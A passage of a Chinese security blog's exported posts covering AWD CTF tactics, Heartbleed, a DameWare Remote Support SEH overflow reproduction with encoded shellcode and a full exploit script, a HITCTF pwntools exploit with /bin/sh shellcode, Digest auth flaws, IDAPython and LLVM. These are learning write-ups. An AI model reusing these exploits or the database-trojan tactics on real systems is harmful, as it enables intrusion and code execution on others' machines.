server的漏洞然后打全场，可怕，然后貌似只有我们的windows被打宕了一轮扣了30分。linux的话听说那个web服务简单，我们上了qmm的waf然后没有队打进来。上午3个小时的比赛结束了。然后下午更换靶场环境，主办方给了我们两个linux服务器，一个是1.21一个是1.22。21一开始没有找到服务，/var/www/html下面空无一物，然后用nmap扫描服务器查看服务和开放端口终于发现服务开放在8080端口，目录在/var/lib/tomacat/wordpress/下；22的服务能在/var/www/html下找到。找到服务后开始审源码找服务漏洞，在这段时间貌似我们一直在被打后来查到有人在我们的mysql中嵌入了木马，然后一直拿分，后来学长查到了数据库的密码让我去改的时候其实mysql数据库已经崩了，我改的是另一个数据库的密码。好像就是这样了，我们一直在被吊打。但是有dalao在，我们还是拿到了第7，不过我怎么高兴不起来。最后总结一下：这次比赛所有电脑可以看成在一个子网内，也就是说用户和用户之间也可以ping通，但是我想如果你不是dalao应该不会去在时间这么紧张的情况下想着不去打服务器而是个人电脑，说实话如果你的电脑没有瞎开什么服务除非别人有0day，不然能打进来我吃键盘好吧。比赛刚开始的时候会有30分钟的加固时间，在这段时间内你最先要做的事情就是改ssh密码，万一被别人登陆上来就不好玩了。改完密码然后找服务查端口，找到服务后审源码找漏洞，找到漏洞patch后写打全场的exp，这些都最好要在这30分钟内完成.还有就是一定要记得备份，要是自己的web服务被别人打宕了记得把文件补全后再叫主办方重启服务器(其实有root权限可以自己重启)。30分钟一过可以运行一些防御脚本比如文件监控什么的，万一别人在你服务器中藏马你要发现的了；还有比较重要的是审流量，这次比赛因为给了我们root权限，所以我们能运行tcpdump命令把服务器网卡接受到的流量dump保存下来传到主机上用wireshark分析一波，这样我们可以发现是谁在打我们，怎么打的我们，于是我们就能及时查找到漏洞所在并patch，运气好的话我们还能把别人打我们的流量分析一波提取出exp然后去打别的队。还有就是数据库，数据库和web服务关联是很大的，我们可以去网站源文件中找调用了数据库用户和密码的文件，这样就可以知道数据库用户名和密码，然后改完自己数据库的root密码后打别的队，比如数据库种马什么的。好像只想到这么多，等想到了什么再加上去。最后还是感慨自己还是太菜了，明明什么都不会，还是喜欢一天到晚到处瞎逼逼。而且不注重实践，想来有哪个黑客是没有日过实站的？自己还是naive。","link":"/2017/11/01/CTF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E5%BF%83%E5%BE%97%E4%B8%8E%E4%BD%93%E4%BC%9A/"},{"title":"CVE-2014-0160漏洞分析","text":"0x01 漏洞简介CVE-2014-0160被称为心脏滴血漏洞，影响版本为OpenSSL1.0.1、1.0.1a、1.0.1b、1.0.1c、1.0.1d、1.0.1e、1.0.1f、Beta 1 of OpenSSL 1.0.2等。该漏洞会导致内存越界，攻击者可以远程读取Openssl服务器内存中最多64k的数据。众所周知，https传输的重要信息是经过加密的，可能你获取到了也不能直接利用;但是在内存中，这些关键信息是明文保存的，所以Openssl的危害可想而知，据说利用该漏洞可以获得约30%的https开头网址的用户登陆的账户和密码。漏洞披露后反响巨大，Openssl”心脏滴血”事件因其破坏之大和影响之广，堪称网络安全事件的里程碑。 0x02 Openssl简介人们为了通信安全，使用安全协议进行通信加密，SSL(secure socket layer)就是一种安全协议，后来这款开源软件被广泛使用，常见的https网址以及那把小锁的标志，就代表网站经过ssl证书加密。 0x03 心跳检测Openssl有一个heartBeat的心跳检测扩展，用来检测客户端与服务器之间的连接状态。心跳包就是在客户端和服务器之间定时通知自己状态的一个自定义命令字，按照一定时间间隔发送，类似心跳，所以叫做心跳包。心跳检测主要用于长连接的保活和断线处理。 0x04 漏洞原理心跳包询问会附加一个问询长度，如果这个长度大于实际长度，服务器会返回相同长度的信息;攻击者可以构造特殊的数据包，来造成一个越界访问。 0x05 漏洞分析下面来分析一下漏洞的成因，这边选取openssl-1.0.1.f版本。贴一下地址:https://www.openssl.org/source/old/贴一下官方的修补方案:https://bugzilla.redhat.com/attachment.cgi?id=883475&action=diff可以发现主要是dl_both.c中的dtls1_process_heartbeat(SSL s)函数被修改了，sourceinsight分析一波。 SSL *s就是传进的心跳包，dtls1_process_heartbeat对其进行处理，找到SSL结构体ssl_st: 根据unsigned char *p = &s->s3->rrec.data[0], *pl;找到s3结构体: sourceinsight还是很好用的，右键jump定义就行了，还有全局符号查找，方便的一批。 unsigned char *p = &s->s3->rrec.data[0], *pl;这一行是将客户端发送的心跳包的data进行存放， hbtype=*p++这一行是获取type字段的值。n2s(p, payload);这一行，从p指向的数组中取前两个字节，并存放到变量payload中，这边其实是获取的心跳包的长度。 接下来就是关键 程序将会分配一段由访问者指定大小的内存空间，指针存放到bp中， 之后将返回类型、长度、payload复制进这段空间，然后会根据payload的值获取pl指向内存的payload个字节的数据到bp内存块中，最后全部返回给用户。漏洞就出在这边，由于心跳包阔以用户自己指定，攻击者可以把payload指定的很长，而实际内容只有一个字节，而程序并没有对心跳包的payload长度和实际内容长度做对比，导致了memcpy函数会把心跳包之后的payload个大小的数据全部复制进buffer，最后返回给用户。 0x06 POC贴一下国外dalao的POC: https://github.com/decal/ssltest-stls/blob/master/ssltest-stls.py","link":"/2019/05/05/CVE-2014-0160%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"title":"Clion源码调试问题记录","text":"一、make && Makefile在相对比较大的项目中，项目通常会被模块化，使用make和makefile有助于简明的记录各个模块之间的复杂引用关系；如此之多的源文件，如果每次编译都要去敲gcc指定源文件和头文件以及链接库进行编译的确是个灾难；针对上面的问题，make应运而生。make根据makefile中定义的编译方式进行自动化的、定制化的编译，且能灵活地只对makefile中上次修改的部分进行重编译。 二、Cmake && CMakeLists对于一个大工程来说，编写makefile是非常复杂的，于是有人设想能否有一种工具能够在读入所有源文件之后自动化的生成makefile？Cmake因此产生。但是cmake本身也是有标准的，需要开发人员编写cmakelists去生成makefile。 如图所示： 三、Clion远程编译和调试0、本地编译调试1、ssh远程编译调试步骤一导入clion项目，此过程会自动新建cmakelists 步骤二配置远程地址和本地项目同步到远程的映射地址CLion -> Preference -> ToolChains && Deployment 步骤三clion原生的cmakelists是有问题的，会导致之后的make失败，而原生直接make却是可以的，所以这边需要修改下cmakelists原生的是这样的： 1234567891011121314151617cmake_minimum_required(VERSION 3.14)project(net-tools C)set(CMAKE_C_STANDARD 11)include_directories(.)include_directories(include)include_directories(lib)add_executable(net-tools include/interface.h include/ipx.h include/sockets.h include/util-ank.h lib/activate.c ... ) 修改以后： 12345678910111213cmake_minimum_required(VERSION 3.14)project(netstat C)set(CMAKE_C_STANDARD 11)set(BUILD_DIR .)#add_executable()#add_custom_target(netstat command -c ${BUILD_DIR})add_custom_target(netstat COMMAND make -j1 WORKING_DIRECTORY ${CMAKE_CURRENT_SOURCE_DIR}) add_custom_target可以在编译时动态指定命令，以这种模式引用原生的makefile生成makefile，这边将Linux上主目录下make编译后生成的netstat复制到cmake-build-debug目录下，之后debug的时候指定可执行文件就可以进行调试。 步骤四配置调试选项，远端的编译目录需要有可执行文件 2、gdbserver远程调试步骤一在远程机（Linux）上首先进行make编译，之后将编译后的结果用gdbserver挂载在指定端口 步骤二宿主机（Mac）上配置debug选项，指定gdb模式进行远程调试需要注意的是path mappings这边需要将本地源码目录和远端的编译（可执行文件）目录对应起来，否则无法进行调试。 四、总结花了大半天时间搞远程调试也是醉了，功力还是不到家，继续学习。记录下这边总结的几个点。 gdbserver相对来说比ssh远程编译调试要方便（不用写cmakelists） 这篇文章中ssh远程编译那块有点问题后续看能否优化（不应该这麻烦，cmakelists应该可以写成直接在cmake-build-debug目录中生成netstat） clion动调对内存、寄存器等支持不太好，主要还是对代码层变量的显示修改等 初步了解cmake、make、makefile、cmakelists的概念，后续如果有需求可以深入学习","link":"/2020/07/06/Clion%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/"},{"title":"DameWare Remote Support缓冲区溢出漏洞复现","text":"0x01 漏洞描述DameWare是windows上一款著名的远控软件，其在2019年7月刚被曝出某处存在缓冲区溢出攻击，并可执行任意代码，影响版本V.12.1.0.34，这边做一下复现，环境是win 7(32位)。 0x02 漏洞分析根据作者POC，在Tools->Computer Comments->Description功能下的ComputerName文本框内输入超长字符串会导致程序内存溢出崩溃，贴下图 输入5000个A： 程序崩溃： 载入OD分析一下，根据栈回溯找到关键调用函数0x4CADB8，Shift+F9后在ComputerName文本框内输入5000个A，程序断在0x4CADB8处，F8单步步过，发现SEH被覆写为0x00410041 按理说SEH应该会被覆写成0x41414141的，但这边确是0x00410041，根据经验，应该是程序把用户输入的ASCII转换成了UNICODE。 为了能够编写exp，这边需要计算下用户输入的栈空间到SEH的偏移量， 1msf-pattern_create -l 5000 #msf工具生成5000个字符 输入ComputerName文本框后程序断下，单步后发现SEH被更改，堆栈跟随去观察具体覆盖情况 查找偏移: 1msf-pattern_offset -q \"37694136\" -l 5000 发现偏移在260个字节处。 0x03 漏洞脚本编写确定是用户输入转unicode以及溢出偏移量以后就可以编写exp了，主要结构是padding + nseh + seh + shellcode 利用原理如下： 将NSEH的指针覆写为shellcode，将当前SEH的处理函数指针指向POP-POP-RET 触发SEH 将NSEH的指针弹入EIP，执行shellcode 首先在 Immunity debugger 下用mona插件找一个合适的POP-POP-RET地址 由于程序会将用户输入的ascii转为unicode，这边无法找到合适的输入转化为unicode来构造jmp short跳转到shellcode，所以这边使用一种叫做ventian shellcode来进行填充，将shellcode的内存地址放到eax寄存器中，然后push eax到栈上，最后ret eax到eip，通过这种方式去执行shellcode代码。 1234567891011121314151617junk1 = \"A\" * 260nseh = \"\\x61\\x43\" #popad# 0x007a0021 : pop esi # pop edi # retseh = \"\\x21\\x7a\" #unicode将转换为0x007a0021junk2 = \"\\x41\" * 1348 # 将真正的shellcode放在eax中，之后压栈，最后ret(eax)# 20 bytesalign = \"\"align += \"\\x43\" * 10 # Paddingalign += \"\\x58\" # POP EAXalign += \"\\x73\" # Venetian padding# 0012F590 83C0 50 # ADD EAX,50align += u\"\\uC083\" + \"\\x50\" # ADD EAX, 50align += \"\\x73\" # Venetian paddingalign += \"\\x50\" # PUSH EAXalign += \"\\x73\" # Venetian paddingalign += u'\\uC3C3' # RETN 简单来说其实就是找一个接近布置shellcode的缓冲区地址的寄存器，并通过增加/减小它的值来使它指向shellcode，最终通过push reg，ret的方式来跳转到shellcode执行，这边最初的eax距shellcode 50字节的大小，所以需要构造来add eax 50。 之后生成shellcode，这边选用msf来生成，并用一个叫alpha2的工具来将ascii编码的shellcode转为unicode后仍可用的字符串 123msfvenom -p windows/exec CMD=calc -f raw > shellcode.raw./alpha2 eax --unicode --uppercase < shellcode.raw##alpha2生成的shellcode是变化的，生成的shellcode无法成功执行时可以多换几个shellcode试试 这边alpha2不自带，需要自己编译，贴下源码地址 https://github.com/un4ckn0wl3z/Alpha2-encoder/blob/master/alpha2.c 生成shellcode如下: 1shellcode=\"PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBKLIXTBKPKPM0C03YK5P1Y01T4KR0004K22LLTKPRMDTKD2NHLO87PJO601KOFLOLQQCLM2NLMPWQXOLMKQWWK2ZRR2PWTKB2LPDKPJOLDKPLN1RXISOXKQXQPQTKPYMPKQXSTK19LX9SNZPITKOD4KKQYFNQKOVLY1XOLMM1WWOH9P45JVKSSMJXOKSMO43EK4PX4KR8MTM1YC1V4KLL0K4K28MLKQ8STKKT4KKQJ0SYOTMTO41K1KQQR9PZPQKOIP1O1OPZTKN2ZKTMQMBJM1TME5X2KPKPM0PPQXNQTKROSWKOXUGKJP85G2PVQX5VV57MUMKO9EOLKVSLKZU0KKYPT5KUWKOWMCRRRO2JKP0SKO8US31QRLS3M0A\" 0x04 攻击演示将shellcode代入之前编写好的padding+nseh+seh+shellcode+padding的模板，得到攻击代码如下: 1AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaC!zCCCCCCCCCCXs삃PsPs쏃CCCCCCCCCCCCCCCCCCPPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBKLIXTBKPKPM0C03YK5P1Y01T4KR0004K22LLTKPRMDTKD2NHLO87PJO601KOFLOLQQCLM2NLMPWQXOLMKQWWK2ZRR2PWTKB2LPDKPJOLDKPLN1RXISOXKQXQPQTKPYMPKQXSTK19LX9SNZPITKOD4KKQYFNQKOVLY1XOLMM1WWOH9P45JVKSSMJXOKSMO43EK4PX4KR8MTM1YC1V4KLL0K4K28MLKQ8STKKT4KKQJ0SYOTMTO41K1KQQR9PZPQKOIP1O1OPZTKN2ZKTMQMBJM1TME5X2KPKPM0PPQXNQTKROSWKOXUGKJP85G2PVQX5VV57MUMKO9EOLKVSLKZU0KKYPT5KUWKOWMCRRRO2JKP0SKO8US31QRLS3M0ADDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD 提前在0x007a0021处下好断点，进行输入后发现断在了0x007a0021处，单步 ret返回到nseh指向的缓冲代码处 12345add eax 0x50push eaxret 最后ret到真正的shellcode处 执行shellcode，创建calc进程 这边有个问题，按理说padding+nseh+seh+padding+shellcode应该已经能弹calc了，动态调试结果也显示执行calc.exe，但是最后无论怎么改shellcode都是无法弹窗的，看了下作者所说的好像是有坏字符中断了执行流，分析了好久都没理解，很难受，如果有好心dalao知道希望能告知我一下，让我填了这个坑。 这边作者只是在最后的padding后加了两字节unicode就能弹计算器了，神奇，哎，我太难了。 PWN！！！ 0x05 完整脚本123456789101112131415161718#!/usr/bin/env pythonjunk1 = \"\\x41\" * 260nseh = \"\\x61\\x43\"seh = \"\\x21\\x7a\"align = \"\"align += \"\\x43\" * 10 # Paddingalign += \"\\x58\" # POP EAXalign += \"\\x73\" # Venetian paddingalign += u\"\\uC083\" + \"\\x50\" # ADD EAX, 50align += \"\\x73\" # Venetian paddingalign += \"\\x50\" # PUSH EAXalign += \"\\x73\" # Venetian paddingalign += u'\\uC3C3' # RETNjunk2 = \"\\x43\" * 18junk3 = \"\\x44\" * 550 + u\"\\uD066\" + u\"\\u7FFD\" # u\"\\xF0FF\"shellcode = \"PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBKLIXTBKPKPM0C03YK5P1Y01T4KR0004K22LLTKPRMDTKD2NHLO87PJO601KOFLOLQQCLM2NLMPWQXOLMKQWWK2ZRR2PWTKB2LPDKPJOLDKPLN1RXISOXKQXQPQTKPYMPKQXSTK19LX9SNZPITKOD4KKQYFNQKOVLY1XOLMM1WWOH9P45JVKSSMJXOKSMO43EK4PX4KR8MTM1YC1V4KLL0K4K28MLKQ8STKKT4KKQJ0SYOTMTO41K1KQQR9PZPQKOIP1O1OPZTKN2ZKTMQMBJM1TME5X2KPKPM0PPQXNQTKROSWKOXUGKJP85G2PVQX5VV57MUMKO9EOLKVSLKZU0KKYPT5KUWKOWMCRRRO2JKP0SKO8US31QRLS3M0A\"crash = junk1 + nseh + seh + align + junk2 + shellcode + junk3print(crash) 贴下漏洞信息 https://www.exploit-db.com/exploits/47444","link":"/2019/10/29/DameWare-Remote-Support%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"title":"Digest初理解","text":"0x01 简介Http digest被称作摘要访问认证，它是一种服务器同浏览器进行消息认证方法。它在密码发出前先对其应用hash函数，这相对于http basic认证发送明文而言更加安全。从技术上来说，digest摘要认证是使用随机数来阻止密码分析的MD5哈希函数应用，也是基于http协议的。 这边贴下wiki: HTTP摘要认证 0x02 digest出现的原因digest出现以前http服务的消息认证是基于basic的，但是随着时间的流逝，basic认证变的越来越不安全，它暴露出很多缺陷 明文传输 basic认证对消息字段进行base64加密传输，然鹅base64是可逆的，一旦被中间人攻击截取消息，重要数据就泄露了，相当于是明文传输消息。 重放攻击 就算其字段是经过加密传输，同样逃不过arp，一旦数据包被截获，攻击者可以通过重放数据包给服务器获取访问权，早期的basic只有用户名密码字段，并没有时间戳验证之类的，所以很容易被攻击。 不支持对称认证 basic服务不支持证书认证，客户端不能确定唯一服务器，攻击者可以伪造成服务器给客户端下指令。 ETC basic认证还有很多缺陷，它只能用在一些简单的场景，大型项目是不能很好支持的。 basic被证明不安全后，digest应运而生。 digest的优点如下 摘要传输 用户名密码等字段是hash以后再进行传输的，由于hash不可逆，攻击者无法直接得到用户的认证信息。 随机数认证 每次认证，服务器会生成一个随机数发送给客户端，客户端给服务器发送认证信息时会带上此参数，一旦服务器检测到客户端传递的nonce随机数和其保存的不一致，则判定为重放，服务器会返回401未认证的消息给客户端，这样就能有效防止重放。 nonceCount认证 这个参数能够对通信次数进行标记并与服务端保存的此参数进行对比，一旦不一致，服务器返回401未认证消息。 digest弥补了basic一些安全缺陷，所以之后的一段时间内都是用digest代替basic。 0x03 功能&实现digest认证有几个重要参数如下 realm server端域名 nonce 服务器随机产生的字符串，是时间+密语的md5，由于加入了时间标识，所以它是有时效性的。 qop 用来说明服务器/客户端用哪种方式来进行加密/解密 nonceCount(nc) 标记客户端的请求次数，服务器端也会进行记录来防止重放 uri 记录下客户端访问的url digest请求过程如下: 首先，客户端发送一个请求给服务端，服务端生成nonce字符串，realm等参数值，并返回给客户端一个401未认证的状态包，web上出现弹框，显示要求用户输入用户名和口令。客户端收到返回的包后将username、realm、password按照username:realm:password的方式进行hash后保存为HA1，再将请求方法method和请求url进行hash保存为HA2，之后HA1和HA2根据qop标识的认证方式和其它重要参数进行hash后的值保存为response再发请求给服务端。 服务端收到请求后先验证nonce是否过期，过期的话直接反回401未认证，之后比较nc值，若不是nc+1则说明进行了重放，则返回401状态，如果之前验证都通过了，则比较最终的hash是否一致，若一致，说明用户名密码等关键信息没有问题，服务端返回200。 0x04 攻击面 Digest虽然有自己的标准，但是却不是一个固定的算法，它是需要用户去自定义自实现的，正是这一点导致了很多应用digest机制却没能安全实现算法的厂商产品有致命漏洞。 如果qop未指定，则ha1固定(HA1=MD5(A1)=MD5(username:realm:password))，且HA2固定(HA2=MD5(A2)=MD5(method:digestURI))，而response=MD5(HA1:nonce:HA2)，这边非常容易被中间人。 很多开发者只存储HA1，而不去验证HA2，仅通过HA1中用户名、安全域、密码的hash值去校验用户登录信息是否正确，安全性底下。 0x05 替代方案Digest相对basic是进步的，但是安全度仍然不高，建议使用https进行认证，提高安全性。 0x06 案例某著名IOT厂商设备存在此漏洞，开发者在实现digest认证时没有对HA2进行校验，导致可以在30s内(nonce未过期时间内)通过重放攻击修改URI进行任意API调用，相当于命令执行了。目前已提交CNVD，最新版本已修复。","link":"/2019/07/05/Digest%E5%88%9D%E7%90%86%E8%A7%A3/"},{"title":"HITCTF DragoBall WP","text":"HITCTF DragonBall WP​ 这段时间打算刷下之前哈工大的pwn。今天是第一天，本来打算搞两三道的结果发现一个栈就看了一天，哎果然还是太菜了。 拿到题目先checksc看发现什么保护都没有开，判断应该是栈，扔ida一审发现他没有check负数，check的逻辑是当钱为0时不能购买Dragonball，但是这里可以通过买-卖-再买使钱数不能被5整除，这样的话就能绕过check进入wish函数。wish函数中有两个输入，其中一个可以溢出，但是只能刚好溢出到ret，一开始觉得rop的话利用起来应该会比较烦，毕竟它能溢出的字节数还是比较少，而且他这里没有开nx，应该是通过写shellcode来getshell。这样想后便往写shellcode上去看，发现可以通过控制ebp来控制wish函数中写入的位置，由于wish函数中两次获取用户输入都是一个ebp，gdb跟了一下发现可以同时控制往bss段和got段写任意值（由于bss段足够大），于是打算复写puts的got为shellcode在bss段的起始地址，这样当wish函数中最后调用puts的时候就回去执行shellcode。完美。 emmmmm然而利用并没有成功。调了一下发现程序接收输入变成了从输出去接收，也就是read函数的fd变成了1，这样的话构造的字符串程序无法接收，但是这里第一次输入之后会输入目标空间中的值，也就是说这里我们可以得到程序的libc库。然后后来看了一下好像还是无法利用就先放弃了这个方法。 之后通过之前泄露libc库想到如果wish函数中第一次输入的时候将缓冲区填满，就能泄露ebp，一旦泄露ebp，栈上的所有地址都可以通过泄露的ebp+偏移得到，这时如果我们将shellcode布置在栈上，同时将ret复写为ebp-偏移，使ret指向栈上的那部分shellcode，我们就能getshell了。这里也有很多坑，主要就是程序输出的串没有接收导致进程阻塞之类的，还有就是最好不要去任意改变程序执行流程，这样可能会破坏栈结构，导致一些莫名其妙的问题，最后就是这里用shellcraft生成的shellcode好像不行，只好自己去网上找到能用的shellcode。这道题应该还有其它的方法，等下次再填坑。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465from pwn import *context(log_level='debug',arch='i386',os='linux')p=process('./DragonBall')elf=ELF('./DragonBall')gdb.attach(p,''' break *0x080487C0 break *0x08048791 continue''')def buy(): p.recvuntil('You choice: ') p.sendline('1')def sell(): p.recvuntil('You choice: ') p.sendline('2')def list(): p.recvuntil('You choice: ') p.sendline('3')#def wish():# p.recvuntil('You choice: ')# p.sendline('4')# p.recvuntil('Tell me your wish: ')# p.sendline('a'*0x68)# p.recvuntil('a'*0x68)# a=(u32(p.recv(4)))# p.recvuntil('(Y/N) ')# p.sendline(asm(shellcraft.sh())+(0x3c-len(asm(shellcraft.sh())))*'c'+p32(0x1234))##def exit():# p.recvuntil('You choice: ')# p.sendline('5')buy()sell()buy()buy()buy()buy()buy()buy()buy()p.recvuntil('You choice: ')p.sendline('4')p.recvuntil('Tell me your wish: ')p.sendline('a'*0x67)p.recvuntil('a'*0x67)a=(u32(p.recv(4)))a='0xff'+(hex(a).replace('0x',''))[0:6]print aa=int(a,16)p.recvuntil('(Y/N) ')shellcode='\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x89\\xca\\x6a\\x0b\\x58\\xcd\\x80'shellcode='jhh///sh/bin\\x89\\xe3h\\x01\\x01\\x01\\x01\\x814$ri\\x01\\x011\\xc9Qj\\x04Y\\x01\\xe1Q\\x89\\xe11\\xd2j\\x0bX\\xcd\\x80'shellcode='\\x48\\x31\\xff\\x48\\x31\\xc0\\xb0\\x69\\x0f\\x05\\x48\\x31\\xd2\\x48\\xbb\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x48\\xc1\\xeb\\x08\\x53\\x48\\x89\\xe7\\x48\\x31\\xc0\\x50\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05'shellcode='\\x31\\xc9\\x31\\xd2\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc0\\xb0\\x0b\\xcd\\x80'#shellcode=asm(shellcraft.sh())leng=len(shellcode)#p.sendline((shellcode)+(0x3c-len((shellcode)))*'c'+p32(0x1234))p.sendline(shellcode+'a'*(0x3c-leng)+p32(a-0x58))p.interactive()","link":"/2018/08/02/DragonBall/"},{"title":"IdaPython使用小结","text":"0x01 介绍IdaPython是ida内置的一个强大工具，可以自动化处理繁琐的逆向工程任务。之前一直觉得IdaPython太过小众，一直没有去学习相关的操作，最近才有时间了解了个大概，这边做一个小小的总结。 IdaPython和IDC同样都是利用Ida的api进行自动化操作的工具，其中IdaPython基于Python，而IDC是基于C的。 IdaPython在2004年被开发出来，其目的是为了将Python简洁的语法和Ida支持的IDC语言结合起来。 IdaPython由三个独立的模块组成： idc：这个是兼容idc函数的模块 idautils：这是ida中一个高级实用模块 idaapi：允许使用者通过类似的形式，访问更多的底层数据 IdaPython命名采用“驼峰命名法”，函数名称类似”GetFunctionName“这种，一个函数名中每个单词的开头一个字符大写，看起来就像是骆驼的驼峰一样，这就是这个命名的由来。 0x02 功能IdaPython可以通过基于capstone反汇编引擎的api实现函对二进制程序进行跟踪，其可以细粒度到指令、寄存器级别，加深我们对程序的理解。 常见的功能比如： 指令处理 1、获取当前指令地址 ea=here() print hex(ea) 2、获取当前汇编指令 idc.GetDisasm(ea) 3、获取当前处于的段 idc.SegName() 函数操作 1、获取所有函数的名称： 123for func in idautils.Functions(): print hex(func),idc.GetFunctionName(func) 2、计算当前函数指令数： 12ea=here()len(list(idautils.FuncItems(ea))) 指令操作 1、给定地址，打印指令： idc.GetDisasm(ea) 2、 对汇编指令进行拆解： idc.GetMnem：获取指令操作数 交叉引用 1、指令From/To： idautils.CodeRefsTo(here(),0)：指令来自 idautils.CodeRefsFrom(here(),0)：指令目的 2、数据From/To： idautils.DataRefsTo(here(),0) ：数据来自 idautils.DataRefsFrom(here(),0) ：数据目的 0x03 动动手3.1 快捷键使用 运行Ida脚本文件：(Alt+F7) 查看现有的Ida脚本文件：(Alt+F9) 使用Ida内置的脚本命令行：(Shift+F2) 3.2 代码测试现在的IdaPython常被用于程序危险函数查找，这边贴一下实例脚本 12345678910111213141516171819202122232425262728293031323334#coding:utf-8from idaapi import *# 设置颜色def judgeAduit(addr): ''' not safe function handler ''' MakeComm(addr,\"### AUDIT HERE ###\") SetColor(addr,CIC_ITEM,0x0000ff) #set backgroud to red pass# 函数标识 def flagCalls(danger_funcs): count = 0 for func in danger_funcs: faddr = LocByName( func ) if faddr != BADADDR: # Grab the cross-references to this address cross_refs = CodeRefsTo( faddr, 0 ) for addr in cross_refs: count += 1 Message(\"%s[%d] calls 0x%08x\\n\"%(func,count,addr)) judgeAduit(addr) if __name__ == '__main__': ''' handle all not safe functions ''' print \"-------------------------------\" # 列表存储需要识别的函数 danger_funcs = [\"free\",\"strcpy\",\"sprintf\",\"strncpy\"] flagCalls(danger_funcs) print \"-------------------------------\" 3.3 其它这边贴一下IdaPython的一些学习站点，包括文档等 官方文档 常用IdaPython指令 Using IDAPython to Make Your Life Easier etc 0x04 待续","link":"/2019/04/11/IdaPython%E4%BD%BF%E7%94%A8%E5%B0%8F%E7%BB%93/"},{"title":"LLVM初探","text":"0x01 LLVM简介 The LLVM Project is a collection of modular and reusable compiler and toolchain technologies. LLVM是模块化、可重用的编译器以及工具链的集合，有些人把LLVM当成是一个低层的虚拟机(low level virtual machine)，但官方给出的解释是这样的: The name “LLVM” itself is not an acronym; it is the full name of the project. 也就是说LLVM并不是一个缩写，而是整个项目的全名。LLVM和传统的编译器(GCC)是有差别的 传统的编译器架构 传统的编译器架构主要分为三个部分 Frontend:前端包括词法分析、语法分析、语义分析、中间代码生成 Optimizer:优化器主要是对编译前端对生成的中间代码的优化 Backend:后端翻译中间代码为native机器码 LLVM编译器架构 LLVM编译器套件与传统编译器架构的不同之处主要在于 LLVM编译器的前端其它层(优化器、后端)是分离的，LLVM专门有一个Clang子项目用来对源码进行编译，生成IR(intermediate representation)中间字节码;而传统编译器的代表(GCC)由于编译前后端耦合度太高，增加一个前端语言支持或者一个后端平台支持将会变得异常复杂。相比之下LLVM由于是分离式架构，其组件复用性就很高，增加语言/平台支持也相对容易，增加一个新的编程语言，就增加一个新的前端组件，增加一个新的平台支持，就增加一个新的后端组件。 LLVM编译器不同的前端统一使用相同的中间码，不像GCC有各种风格(intel&ATT) LLVM经常被用于一些解释型语言的动态编译(优化)。类似的JAVA虚拟机(JVM)的JIT(好像现在就有厂在做基于LLVM的JAVA JIT编译器，负责将高层字节码(java-bytecode)解析成相对底层的IR中间码，之后编译成相应平台的机器码执行。 LLVM也经常被用于一些语言的静态编译，类似的Objective-c就是使用Clang进行编译(之前其实也是使用GCC的,但现在连Xcode的内置编译器都换成Clang了)，据说编译时间是GCC的1/3，语法树占用内存是GCC的1/5，而且诊断信息可读性强，不像GCC是一大坨不容易识别的那种。 0x02 狭义的LLVM和广义的LLVM 广义的LLVM通常指LLVM编译器的整体架构，而狭义的LLVM通常指不包含前端，只实现中间代码优化和native码生成的部分。IR中间码需要多个pass进行一系列优化后再进行翻译。 0x03 字节码抽象层次比较典型的就是java bytecode与LLVM IR之间的抽象层次比较，java bytecode与LLVM 